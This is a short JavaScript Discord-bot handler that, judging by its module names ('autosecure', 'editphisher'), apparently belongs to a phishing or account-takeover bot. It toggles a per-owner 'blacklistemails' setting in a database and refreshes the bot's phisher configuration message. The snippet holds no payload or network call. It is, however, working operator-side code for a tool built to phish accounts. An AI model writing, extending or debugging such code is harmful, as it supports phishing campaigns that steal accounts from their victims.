const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg")
const { queryParams } = require("../../../db/database")

module.exports = {
    name: "blacklistemails",
    editphisher: true,
    callback: async (client, interaction) => {
        await interaction.deferUpdate();
        let [t, botnumber, ownerid] = interaction.customId.split("|")
        let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`, [ownerid, botnumber])
        const blacklistvalue = settings[0].blacklistemails

        const newinteger = blacklistvalue === 1 ? 0 : 1

        await queryParams(`UPDATE autosecure SET blacklistemails=? WHERE user_id=? AND botnumber=?`, [newinteger, ownerid, botnumber])

        let msg = await editphishermsg(botnumber, ownerid, interaction.user.id)
        await interaction.editReply(msg)
    }
}
